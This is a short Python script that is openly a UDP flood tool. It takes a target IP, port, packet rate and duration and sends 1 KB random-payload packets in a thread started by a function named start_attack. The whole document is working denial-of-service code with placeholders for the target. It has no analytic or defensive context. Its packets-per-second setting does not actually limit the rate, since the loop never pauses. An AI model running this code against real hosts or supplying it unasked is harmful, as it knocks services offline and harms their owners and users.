import socket
import random
import time
import threading

def send_udp_packet(ip, port, pps, secs):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  # Random payload of 1 KB

    end_time = time.time() + secs
    while time.time() < end_time:
        for _ in range(pps):
            client.sendto(bytes, (ip, port))

def start_attack(ip, port, pps, secs):
    thread = threading.Thread(target=send_udp_packet, args=(ip, port, pps, secs))
    thread.start()

if __name__ == "__main__":
    # Example usage: python script.py 127.0.0.1 8080 1000 10
    ip = "<IP>"  # Target IP
    port = int("<PORT>")  # Target Port
    pps = int("<PPS>")  # Packets per second
    secs = int("<SECS>")  # Duration in seconds
    
    start_attack(ip, port, pps, secs)
    